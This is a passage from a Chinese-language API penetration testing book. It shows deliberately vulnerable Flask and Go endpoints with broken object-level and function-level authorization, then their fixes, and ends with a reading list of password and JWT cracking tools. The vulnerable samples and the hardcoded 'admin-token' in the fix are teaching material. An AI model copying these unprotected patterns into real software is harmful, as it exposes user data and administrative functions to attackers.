@app.route('/user', methods=['GET'])def get_user():    user_id = request.args.get('id')    user = get_user_by_id(user_id)    if user:        return jsonify(user)    else:        return jsonify({"error": "User not found"}), 404
if __name__ == '__main__':    app.run()
```

任何经过身份验证的用户都可以通过提供他们的 ID 来访问其他用户的详细信息。现在观察一个删除漏洞的示例代码更改：

```
from flask import Flask, request, jsonify
app = Flask(__name__)
def get_current_user():    return {"id": 2, "name": "Bob", "role": "user"}  # Mocked current user
def get_user_by_id(user_id):    users = {        "1": {"id": 1, "name": "Alice", "role": "admin"},        "2": {"id": 2, "name": "Bob", "role": "user"},        "3": {"id": 3, "name": "Charlie", "role": "user"}    }    return users.get(user_id, None)
@app.route('/user', methods=['GET'])def get_user():    current_user = get_current_user()  # Get the authenticated user     user_id = request.args.get('id')    user = get_user_by_id(user_id)
    if not user:        return jsonify({"error": "User not found"}), 404
    # Check if the current user is trying to access their own data
    if str(current_user['id']) != user_id:
        return jsonify({"error": "Forbidden"}), 403
    return jsonify(user)
if __name__ == '__main__':
    app.run()
```

观察`get_user_by_id`函数，当提供无效用户 ID 时返回`None`。接下来我们看一下 BFLA。

## 错误的功能级别授权（BFLA）

当 API 或其背后的应用程序没有正确应用 AuthZ 检查到其函数和操作时，就会发生这种情况，这允许攻击者执行他们没有权限的功能或访问他们没有权限的资源。这个漏洞通常出现在没有访问控制策略或策略缺乏复杂性的情况下，应用程序在没有正确验证用户角色或权限的前提下，信任这些角色或权限并允许执行功能。

例如，考虑一个 API，它提供的功能没有正确限制为授权用户。如果一个权限较低的渗透测试人员可以执行诸如创建或更改用户等任务，那么整个 API 的安全性可能会受到威胁。甚至新管理员也可以由这样的渗透测试人员创建。观察下面的 Golang 代码，它使用了 BFLA：

```
package main
import (
    "encoding/json"
    "net/http"
    "strconv"
    "github.com/gorilla/mux"
)
type User struct {
    ID    int    `json:"id"`
    Name  string `json:"name"`
    Role  string `json:"role"`
}
var users = []User{
    {ID: 1, Name: "Alice", Role: "admin"},
    {ID: 2, Name: "Bob", Role: "user"},
    {ID: 3, Name: "Charlie", Role: "user"},
}
func createUser(w http.ResponseWriter, r *http.Request) {
    var newUser User
    json.NewDecoder(r.Body).Decode(&newUser)
    users = append(users, newUser)
    w.WriteHeader(http.StatusCreated)
    json.NewEncoder(w).Encode(newUser)
}
func main() {
    r := mux.NewRouter()
    r.HandleFunc("/admin/create_user", createUser).Methods("POST")
    http.ListenAndServe(":8000", r)
}
```

任何用户都可以访问`/admin/create_user`端点来创建新用户。现在看看一个建议的代码来修复这个漏洞：

```
package main
import (
    "encoding/json"
    "net/http"
    "strings"
    "github.com/gorilla/mux"
)
type User struct {
    ID    int    `json:"id"`
    Name  string `json:"name"`
    Role  string `json:"role"`
}
var users = []User{
    {ID: 1, Name: "Alice", Role: "admin"},
    {ID: 2, Name: "Bob", Role: "user"},
    {ID: 3, Name: "Charlie", Role: "user"},
}
func getCurrentUser(r *http.Request) *User {
    authHeader := r.Header.Get("Authorization")
    if strings.HasPrefix(authHeader, "Bearer ") {
        token := strings.TrimPrefix(authHeader, "Bearer ")
        if token == "admin-token" {
            return &User{ID: 1, Name: "Alice", Role: "admin"}
        }
    }
    return nil
}
func requireAdminRole(next http.Handler) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request){
        user := getCurrentUser(r)
        if user == nil || user.Role != "admin" {
            http.Error(w, "Forbidden", http.StatusForbidden)
            return
        }
        next.ServeHTTP(w, r)
    })
}
func createUser(w http.ResponseWriter, r *http.Request) {
    var newUser User
    json.NewDecoder(r.Body).Decode(&newUser)
    users = append(users, newUser)
    w.WriteHeader(http.StatusCreated)
    json.NewEncoder(w).Encode(newUser)
}
func main() {
    r := mux.NewRouter()
    r.Handle("/admin/create_user", requireAdminRole(http.HandlerFunc(createUser))).Methods("POST")
    http.ListenAndServe(":8000", r)
}
```

你刚刚学习了如何通过简单的代码修改来识别和修复影响 API 的最危险漏洞之一。`getCurrentUser`和`requireAdminRole`函数的实现是为了加强 AuthZ 逻辑的保护。

# 总结

本章讨论了与 API 渗透测试相关的其他话题。我们研究了 AuthN 和 AuthZ 机制，它们的细节，以及它们如何可能表现得足够脆弱，从而被利用。你还学习了弱 API 凭证和默认账户，以及如何发现和利用它们作为攻击的一部分。这些构成了任何 API 渗透测试中非常重要的一部分，因为其他阶段，如持久性、横向移动和数据外泄，都依赖于成功利用 AuthN 和 AuthZ。

在下一章中，本书的*第三部分*也将介绍注入攻击和验证测试。这些攻击可能造成的损害是巨大的，通过实施正确的用户输入验证来成功防御它们是至关重要的。到时候见！

# 进一步阅读

+   CKAN，一个支持开放数据网站的 Python 框架：[`ckan.org/`](https://ckan.org/)

+   开放数据手册，解释关于开放数据的基本概念：[`opendatahandbook.org/guide/en/`](https://opendatahandbook.org/guide/en/)

+   OAuth 2.0 安全最佳实践：[`datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics`](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics)

+   更多 OAuth 授权流及一些图示：[`frontegg.com/blog/oauth-grant-types`](https://frontegg.com/blog/oauth-grant-types)

+   探索 CookieMonster：[`ian.sh/cookiemonster`](https://ian.sh/cookiemonster)

+   RFC 7517，定义了 JSON Web 密钥：[`datatracker.ietf.org/doc/html/rfc7517`](https://datatracker.ietf.org/doc/html/rfc7517)

+   JWT 破解器，一个用 C 语言编写的暴力破解 JWT 的工具：[`github.com/brendan-rius/c-jwt-cracker`](https://github.com/brendan-rius/c-jwt-cracker)

+   一份精心策划的破解系统工具和列表：[`github.com/n0kovo/awesome-password-cracking`](https://github.com/n0kovo/awesome-password-cracking)

+   *最常见的 200 个* *密码*：[`nordpass.com/most-common-passwords-list/`](https://nordpass.com/most-common-passwords-list/)

+   Mentalist，一个用于创建自定义密码列表的工具：[`github.com/sc0tfree/mentalist`](https://github.com/sc0tfree/mentalist)

+   Patator – 一个具有模糊测试和密码喷洒功能的暴力破解攻击工具：[`salsa.debian.org/pkg-security-team/patator`](https://salsa.debian.org/pkg-security-team/patator)

+   *AWS 资源组标签 API* *参考文档*：[`docs.aws.amazon.com/resourcegroupstagging/latest/APIReference/overview.html`](https://docs.aws.amazon.com/resourcegroupstagging/latest/APIReference/overview.html)

# 第三部分：API 基本攻击

现在，您已经了解了*第二部分*中的基本攻击，接下来是时候继续扩展您对更多攻击类型的了解了。在这一部分，您将学习一些在攻击 API 时不可忽视的技术。我们将讨论适应性的 SQL 和 NoSQL 注入攻击、糟糕的用户输入清理带来的问题、错误处理不当的后果，以及最后备受忌惮的拒绝服务攻击。我们还将为您介绍一些阻止或至少减少此类攻击成功机会的方法。

本节包含以下章节：

+   *第五章*，*注入攻击与验证测试*

+   *第六章*，*错误处理与异常测试*

+   *第七章*，*拒绝服务与速率限制测试*
